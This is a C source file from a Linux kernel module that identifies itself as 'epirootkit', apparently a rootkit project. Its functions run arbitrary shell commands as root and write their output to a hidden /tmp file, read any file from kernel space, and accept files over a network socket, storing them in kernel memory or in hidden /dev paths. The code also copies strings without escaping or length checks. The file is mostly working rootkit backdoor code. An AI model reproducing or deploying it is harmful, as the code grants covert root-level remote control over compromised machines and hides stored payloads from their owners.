#include "commandes.h"
#include "cache.h"

char *executer_commande(char *cmd)
{
    char *resultat;
    char *temp_file = "/tmp/.cmd_output";
    char *cmd_with_bash = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    struct file *f;
    loff_t pos = 0;
    char *argv[] = {"/bin/bash", "-c", cmd_with_bash, NULL};
    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
    int ret;
    int len;

    resultat = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    if (!resultat)
        return NULL;
    
    snprintf(cmd_with_bash, TAILLE_BUFFER, "bash -c \"%s > /tmp/.cmd_output 2>&1\"", cmd);
    
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
    f = filp_open(temp_file, O_RDONLY, 0);
    if (IS_ERR(f)) {
        sprintf(resultat, "Execution terminee avec code: %d (sortie non capturee)", ret);
        kfree(cmd_with_bash);
        return resultat;
    }
    
    memset(resultat, 0, TAILLE_BUFFER);
    kernel_read(f, resultat, TAILLE_BUFFER - 1, &pos);
    filp_close(f, NULL);
    
    f = filp_open(temp_file, O_WRONLY | O_TRUNC | O_CREAT, 0644);
    if (!IS_ERR(f))
        filp_close(f, NULL);
    
    len = strlen(resultat);
    if (len < TAILLE_BUFFER - 40)
        sprintf(resultat + len, "\n\nCode de retour: %d", ret / 256);
    
    kfree(cmd_with_bash);
    return resultat;
}

char *lire_fichier(char *chemin)
{
    struct file *f;
    loff_t pos = 0;
    char *contenu;
    int err;
    
    contenu = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    if (!contenu)
        return NULL;
        
    memset(contenu, 0, TAILLE_BUFFER);
    f = filp_open(chemin, O_RDONLY, 0);
    if (IS_ERR(f)) {
        sprintf(contenu, "Erreur ouverture fichier: %ld", PTR_ERR(f));
        return contenu;
    }
    
    err = kernel_read(f, contenu, TAILLE_BUFFER - 1, &pos);
    if (err < 0)
        sprintf(contenu, "Erreur lecture fichier: %d", err);
    
    filp_close(f, NULL);
    return contenu;
}

int recevoir_fichier(struct socket *sock_client, const char *nom, const char *methode, const char *chemin)
{
    unsigned char *buffer;
    int recu = 0;
    int ret = 0;
    struct msghdr msg;
    struct kvec iov;
    
    pr_info("epirootkit: Debut reception fichier: %s, methode: %s\n", nom, methode);
    
    buffer = kmalloc(MAX_TAILLE_FICHIER, GFP_KERNEL);
    if (!buffer)
        return -ENOMEM;
    
    memset(&msg, 0, sizeof(msg));
    
    iov.iov_base = buffer;
    iov.iov_len = MAX_TAILLE_FICHIER;
    
    ret = kernel_recvmsg(sock_client, &msg, &iov, 1, MAX_TAILLE_FICHIER, 0);
    
    if (ret > 0) {
        recu = ret;
        pr_info("epirootkit: Donnees recues: %d octets\n", recu);
        
        if (strcmp(methode, "kernel") == 0) {
            pr_info("epirootkit: Stockage en memoire kernel\n");
            ajouter_fichier_cache(nom, buffer, recu);
        } else if (strcmp(methode, "fs") == 0) {
            char chemin_final[256];
            if (chemin && strlen(chemin) > 0) {
                strcpy(chemin_final, chemin);
            } else {
                sprintf(chemin_final, "/dev/.%lx", (unsigned long)jiffies);
            }
            pr_info("epirootkit: Stockage dans le fichier: %s\n", chemin_final);
            cacher_fichier_fs(nom, buffer, recu, chemin_final);
        }
        iov.iov_base = "Fichier recu et stocke avec succes";
        iov.iov_len = strlen("Fichier recu et stocke avec succes");
        kernel_sendmsg(sock_client, &msg, &iov, 1, strlen("Fichier recu et stocke avec succes"));
    } else {
        pr_err("epirootkit: Erreur reception fichier: %d\n", ret);
    }
    kfree(buffer);
    return recu;
}
